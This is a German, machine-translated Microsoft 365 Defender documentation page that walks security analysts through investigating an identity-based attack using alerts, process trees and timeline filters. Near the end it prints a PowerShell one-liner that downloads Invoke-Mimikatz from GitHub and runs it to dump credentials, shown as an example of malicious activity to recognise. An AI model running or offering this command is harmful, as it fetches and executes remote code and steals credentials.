---
title: Beispiel für einen identitätsbasierten Angriff
description: Gehen Sie durch eine Beispielanalyse eines identitätsbasierten Angriffs.
keywords: Vorfälle, Warnungen, untersuchen, Korrelation, Angriff, Computer, Geräte, Benutzer, Identitäten, Identität, Postfach, E-Mail, 365, microsoft, m365, Reaktion auf Vorfälle, Cyberangriff
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 05/10/2021
ms.locfileid: "52297188"
---
# <a name="example-of-an-identity-based-attack"></a>Beispiel für einen identitätsbasierten Angriff

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Gilt für:**
- Microsoft 365 Defender

Microsoft Defender for Identity kann dabei helfen, böswillige Versuche zu erkennen, Identitäten in Ihrer Organisation zu schädlich zu machen. Da Defender for Identity in Microsoft 365 Defender integriert ist, können Sicherheitsanalysten Einblick in Bedrohungen von Defender for Identity erhalten, z. B. mutmaßliche Netlogon-Rechteerweiterungsversuche.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analysieren des Angriffs in Microsoft Defender for Identity

Microsoft 365 Defender ermöglicht Es Analysten, Warnungen nach Erkennungsquelle auf der Registerkarte **Warnungen** auf der Seite Vorfälle zu filtern. Im folgenden Beispiel wird die Erkennungsquelle nach **Defender for Identity gefiltert.** 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Beispiel für das Filtern der Erkennungsquelle für Defender for Identity":::

Wenn Sie **die Warnung für mutmaßliche Überführungen im** Hash auswählen, wird eine Seite in Microsoft Cloud App Security angezeigt, auf der ausführlichere Informationen angezeigt werden. Sie können immer mehr über eine Warnung oder einen Angriff erfahren, [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) indem Sie **Weitere** Informationen zu diesem Warnungstyp auswählen, um eine Beschreibung des Angriffs sowie Korrekturvorschläge zu lesen.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Beispiel für eine mutmaßliche Benachrichtigung über die Überführung des Hashangriffs"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Untersuchen desselben Angriffs in Microsoft Defender for Endpoint

Alternativ kann ein Analyst Defender for Endpoint verwenden, um mehr über die Aktivität auf einem Endpunkt zu erfahren. Wählen Sie den Vorfall aus der Warteschleife aus, und wählen Sie dann die Registerkarte **Warnungen** aus. Von hier aus können sie auch die Erkennungsquelle identifizieren. Eine Erkennungsquelle, die als EDR bezeichnet wird, steht für Endpoint Detection and Response, also Defender for Endpoint. Hier wählt der Analyst eine warnung aus, die von einem EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Beispiel für eine Endpunkterkennung und -antwort in Defender for Endpoint"::: 

Auf der Warnungsseite werden verschiedene relevante Informationen angezeigt, z. B. der Name des betroffenen Geräts, der Benutzername, der Status der automatischen Untersuchung und die Warnungsdetails. Der Warnungsstory zeigt eine visuelle Darstellung der Prozessstruktur. Die Prozessstruktur ist eine hierarchische Darstellung von übergeordneten und untergeordneten Prozessen im Zusammenhang mit der Warnung.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Beispiel für eine Benachrichtigungsprozessstruktur in Defender for Endpoint"::: 

Jeder Prozess kann erweitert werden, um weitere Details anzuzeigen. Details, die ein Analyst sehen kann, sind die tatsächlichen Befehle, die als Teil eines bösartigen Skripts eingegeben wurden, ip-Adressen für ausgehende Verbindungen und andere nützliche Informationen.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Beispiel für Prozessdetails in Defender for Endpoint":::
 
Wenn Sie **in der Zeitachse anzeigen** auswählen, kann ein Analyst einen Drilldown noch weiter gehen, um den genauen Zeitpunkt des Kompromisses zu ermitteln. 

Microsoft Defender for Endpoint kann viele schädliche Dateien und Skripts erkennen. Aufgrund vieler legitimer Verwendungen für ausgehende Verbindungen, PowerShell und Befehlszeilenaktivitäten würden einige Aktivitäten jedoch als gutartig angesehen, bis eine schädliche Datei oder Aktivität erstellt wird. Daher hilft die Verwendung der Zeitachse Analysten, die Warnung in den Kontext mit der umgebenden Aktivität zu setzen, um die ursprüngliche Quelle oder den Zeitpunkt des Angriffs zu bestimmen, die andernfalls durch allgemeine Dateisystem- und Benutzeraktivitäten verdeckt werden. 

Zu diesem Zeitpunkt würde ein Analyst zum Zeitpunkt der Warnungserkennung (in Rot) beginnen und einen Bildlauf nach unten durchführen, um zu bestimmen, wann die ursprüngliche Aktivität, die zu den schädlichen Aktivitäten führte, tatsächlich gestartet wurde. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Beispiel für das Starten zum Zeitpunkt der Warnungserkennung"::: 

Es ist wichtig, allgemeine Aktivitäten wie Windows Updateverbindungen, Windows vertrauenswürdigen Softwareaktivierungsverkehr, andere häufige Verbindungen zu Microsoft-Websites, Internetaktivitäten von Drittanbietern, Microsoft Endpoint Configuration Manager-Aktivitäten und andere gutartige Aktivitäten von verdächtigen Aktivitäten zu verstehen und zu unterscheiden. Eine Möglichkeit dazu ist die Verwendung von Zeitachsenfiltern. Es gibt viele Filter, die bestimmte Aktivitäten hervorheben können, während alles herausfiltert wird, was der Analyst nicht anzeigen möchte. 

In der folgenden Abbildung hat der Analytiker gefiltert, um nur Netzwerk- und Prozessereignisse anzeigen zu können. Auf diese Weise kann der Analyst die Netzwerkverbindungen und Prozesse sehen, die das Ereignis umgeben, Editor eine Verbindung mit einer IP-Adresse hergestellt hat, die wir auch in der Prozessstruktur gesehen haben. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Beispiel, wie Editor zum Herstellen einer schädlichen ausgehenden Verbindung verwendet wurde"::: 

In diesem speziellen Ereignis wurde Editor verwendet, um eine schädliche ausgehende Verbindung herzustellen. Häufig verwenden Angreifer jedoch einfach iexplorer.exe, um Verbindungen zum Herunterladen einer schädlichen Nutzlast herzustellen, da normalerweise iexplorer.exe Prozesse als reguläre Webbrowseraktivitäten angesehen werden.

Ein weiteres Element, nach dem sie in der Zeitachse suchen sollten, wäre die Verwendung von PowerShell für ausgehende Verbindungen. Der Analyst würde nach erfolgreichen PowerShell-Verbindungen mit Befehlen suchen, z. B. gefolgt von einer ausgehenden Verbindung zu einer Website, die `IEX (New-Object Net.Webclient)` eine schädliche Datei hosten. 

Im folgenden Beispiel wurde PowerShell zum Herunterladen und Ausführen von Mimikatz von einer Website verwendet:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Ein Analytiker kann schnell nach Schlüsselwörtern suchen, indem er das Schlüsselwort in der Suchleiste eintippt, um nur ereignisse anzeigen zu können, die mit PowerShell erstellt wurden. 

## <a name="next-step"></a>Nächster Schritt

Weitere Informationen finden Sie unter Phishing-Untersuchungspfad. [](first-incident-path-phishing.md)

## <a name="see-also"></a>Siehe auch

- [Übersicht über Vorfälle](incidents-overview.md)
- [Verwalten von Vorfällen](manage-incidents.md)
- [Untersuchen von Vorfällen](investigate-incidents.md)
